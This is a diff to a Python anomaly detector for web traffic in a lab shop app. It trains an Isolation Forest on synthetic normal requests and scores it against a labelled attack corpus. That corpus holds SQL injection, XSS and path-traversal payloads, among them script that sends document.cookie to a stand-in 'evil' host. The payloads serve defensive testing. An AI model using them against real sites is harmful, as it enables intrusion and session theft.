@@ -49,33 +49,62 @@ def caracteristicas(texto):
         t.count(";") + t.count("--") + t.count("/*"),  # separadores/comentarios
         t.count(" "),                             # espacios
         max((len(x) for x in tokens), default=0), # token mas largo
+        t.count(".."),                            # '..' -> path traversal
     ]
 
-def corpus_normal(n=2000):
-    """Genera trafico realista NORMAL para entrenar."""
-    palabras = ["hola", "producto", "precio", "camiseta", "zapato", "consulta",
-                "pedido", "gracias", "buenas", "oferta", "talla", "color", "envio"]
-    emails = ["ana", "juan", "pedro", "lucia", "cliente", "daniel", "maria", "jose"]
+PALABRAS = ["hola", "producto", "precio", "camiseta", "zapato", "consulta", "pedido",
+            "gracias", "buenas", "oferta", "talla", "color", "envio", "factura",
+            "calidad", "rapido", "recomiendo", "perfecto", "tienda", "compra", "genial"]
+NOMBRES = ["ana", "juan", "pedro", "lucia", "cliente", "daniel", "maria", "jose", "marta", "luis"]
+
+def corpus_normal(n=3000):
+    """Trafico realista NORMAL (incluye puntuacion legitima: parentesis, apostrofes)."""
     out = []
     for _ in range(n):
         r = random.random()
-        if r < 0.3:
-            out.append(random.choice(["/", "/admin", "/stream", "/logout", "/muro"]))
-        elif r < 0.55:
-            pw = "".join(random.choices("abcdefghABCDEFGH12345678", k=random.randint(8, 14)))
-            out.append(f"/login email={random.choice(emails)}@fortaleza.lab password={pw}")
-        elif r < 0.8:
-            out.append(f"/muro autor={random.choice(emails)} mensaje="
-                       + " ".join(random.choices(palabras, k=random.randint(2, 9))))
+        if r < 0.25:
+            out.append(random.choice(["/", "/admin", "/stream", "/logout", "/muro",
+                                       "/favicon.ico", "/mapa", "/api/ataques"]))
+        elif r < 0.5:
+            pw = "".join(random.choices("abcdefghijkABCDEFGHJK0123456789-_!", k=random.randint(8, 16)))
+            out.append(f"/login email={random.choice(NOMBRES)}@fortaleza.lab password={pw}")
+        elif r < 0.78:
+            msg = " ".join(random.choices(PALABRAS, k=random.randint(2, 10)))
+            if random.random() < 0.2:
+                msg += " (recomendado)"                      # parentesis legitimos
+            if random.random() < 0.15:
+                msg = "me ha encantado, repetire sin duda"
+            out.append(f"/muro autor={random.choice(NOMBRES)} mensaje={msg}")
         else:
-            out.append("/?q=" + " ".join(random.choices(palabras, k=random.randint(1, 3))))
+            out.append("/?q=" + " ".join(random.choices(PALABRAS, k=random.randint(1, 4))))
+    return out
+
+def corpus_ataques(n=500):
+    """Corpus de ATAQUES etiquetado (variado) para medir deteccion."""
+    sqli = ["' OR 1=1--", "1 UNION SELECT user,pass FROM users", "admin'--",
+            "1 AND SLEEP(5)", "' OR 'a'='a'--", "1); DROP TABLE users--", "1 OR 7=7",
+            "' UNION SELECT NULL,NULL--", "1 AND 1=1 UNION SELECT password FROM users"]
+    xss = ["<script>alert(1)</script>", "<svg onload=alert(1)>", "<img src=x onerror=alert(1)>",
+           "<details open ontoggle=alert(document.cookie)>", "<body onpointerover=alert(1)>",
+           "javascript:alert(document.cookie)", "\"><script>fetch('http://evil/'+document.cookie)</script>"]
+    trav = ["../../../etc/passwd", "....//....//etc/shadow", "..%2f..%2fetc%2fpasswd", "/etc/passwd"]
+    enc = ["1%2520UNION%2520SELECT%2520pass", "%3Cscript%3Ealert(1)%3C/script%3E", "%27%20OR%201%3D1--"]
+    out = []
+    for _ in range(n):
+        t = random.random()
+        if t < 0.35:   out.append("/?q=" + random.choice(sqli))
+        elif t < 0.6:  out.append("/muro mensaje=" + random.choice(xss))
+        elif t < 0.75: out.append("/?file=" + random.choice(trav))
+        elif t < 0.9:  out.append("/?q=" + random.choice(enc))
+        else:          out.append("/?d=" + "QWxhZGRpbjpvcGVu" * random.randint(8, 25))
     return out
 
 Z_UMBRAL = 6.0   # nº de desviaciones para considerar una caracteristica anomala
 
-# caracteristicas que en trafico normal son ~siempre 0; si aparecen, es novedad
-# indices: 5 palabras_mayus, 6 comillas, 7 angulos, 8 parentesis, 10 pct, 11 separadores
-PELIGROSAS = [5, 6, 7, 8, 10, 11]
+# caracteristicas que en trafico normal son ~siempre 0; si aparecen, es novedad.
+# (Los parentesis se EXCLUYEN: aparecen en texto legitimo "(recomendado)".)
+# indices: 5 palabras_mayus, 6 comillas, 7 angulos, 10 pct, 11 separadores, 14 '..'
+PELIGROSAS = [5, 6, 7, 10, 11, 14]
 
 class ModeloAnomalias:
     """Ensemble de 3 senales (anomalo si CUALQUIERA salta):
@@ -99,46 +128,49 @@ class ModeloAnomalias:
 
 def entrenar():
     X = np.array([caracteristicas(s) for s in corpus_normal()], dtype=float)
-    iforest = IsolationForest(contamination=0.04, n_estimators=300, random_state=0).fit(X)
-    modelo = ModeloAnomalias(iforest, X.mean(axis=0), X.std(axis=0), X.max(axis=0))
-    joblib.dump(modelo, RUTA_MODELO)
-    return modelo
+    iforest = IsolationForest(contamination=0.01, n_estimators=300, random_state=0).fit(X)
+    # Guardamos los COMPONENTES (no la clase) para que el modelo se pueda cargar
+    # tanto si cerebro_ia se ejecuta como script como si se importa.
+    comp = {"iforest": iforest, "media": X.mean(axis=0),
+            "desv": X.std(axis=0), "maximos": X.max(axis=0)}
+    joblib.dump(comp, RUTA_MODELO)
+    return ModeloAnomalias(**comp)
 
 def cargar():
-    return joblib.load(RUTA_MODELO) if os.path.exists(RUTA_MODELO) else entrenar()
+    if os.path.exists(RUTA_MODELO):
+        return ModeloAnomalias(**joblib.load(RUTA_MODELO))
+    return entrenar()
 
 def es_anomalo(texto, modelo=None):
     return (modelo or cargar()).es_anomalo(texto)
 
-# ---- Demo / evaluacion ---------------------------------------------------
-if __name__ == "__main__":
-    m = entrenar()
-    print("Modelo entrenado con trafico normal.\n")
+# ---- Evaluacion profesional (precision/recall sobre datos no vistos) ------
+def evaluar():
+    random.seed(1)
+    normal = corpus_normal(3000); random.shuffle(normal)
+    corte = int(len(normal) * 0.8)
+    train, test_norm = normal[:corte], normal[corte:]   # el modelo NO ve test_norm
+    X = np.array([caracteristicas(s) for s in train], dtype=float)
+    iforest = IsolationForest(contamination=0.01, n_estimators=300, random_state=0).fit(X)
+    m = ModeloAnomalias(iforest, X.mean(axis=0), X.std(axis=0), X.max(axis=0))
 
-    normales = [
-        "/login email=ana@fortaleza.lab password=abcd1234",
-        "/muro autor=juan mensaje=hola buenas gracias por el envio",
-        "/", "/admin", "/stream",
-        "/?q=camiseta precio",
-    ]
-    ataques = [
-        "/?q=1 UNION SELECT password FROM users",
-        "/muro mensaje=<details open ontoggle=alert(document.cookie)>",   # evadio la regex
-        "/login email=' OR 1=1-- password=x",
-        "/?q=1%2520UNION%2520SELECT%2520pass",                            # doble codificacion
-        "/?x=<svg/onload=fetch('http://evil/'+document.cookie)>",
-        "/?d=" + "QWxhZGRpbjpvcGVuIHNlc2" * 15,                           # blob raro (exfil)
-    ]
-    print("NORMALES (deberian pasar):")
-    fp = 0
-    for s in normales:
-        a = es_anomalo(s, m)
-        fp += a
-        print(f"  {'ANOMALO' if a else 'normal ':>7}  {s[:60]}")
-    print("\nATAQUES (deberian marcarse):")
-    tp = 0
-    for s in ataques:
-        a = es_anomalo(s, m)
-        tp += a
-        print(f"  {'ANOMALO' if a else 'normal ':>7}  {s[:60]}")
-    print(f"\nDeteccion de ataques: {tp}/{len(ataques)}   Falsos positivos: {fp}/{len(normales)}")
+    ataques = corpus_ataques(500)
+    FP = sum(m.es_anomalo(s) for s in test_norm)     # normal marcado como ataque
+    TP = sum(m.es_anomalo(s) for s in ataques)       # ataque detectado
+    FN = len(ataques) - TP
+    fpr = FP / len(test_norm)
+    recall = TP / len(ataques)
+    precision = TP / (TP + FP) if (TP + FP) else 0
+    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) else 0
+    print(f"Entrenado con {len(train)} normales.  Evaluado con {len(test_norm)} "
+          f"normales no vistos + {len(ataques)} ataques.\n")
+    print(f"  Recall (deteccion de ataques) : {recall*100:5.1f}%   ({TP}/{len(ataques)})")
+    print(f"  Falsos positivos (FP rate)    : {fpr*100:5.2f}%   ({FP}/{len(test_norm)})")
+    print(f"  Precision                     : {precision*100:5.1f}%")
+    print(f"  F1-score                      : {f1*100:5.1f}%")
+    return recall, fpr
+
+if __name__ == "__main__":
+    evaluar()
+    entrenar()   # guarda el modelo (entrenado con todo el normal) para la app
+    print("\nModelo guardado en cerebro_ia.joblib")
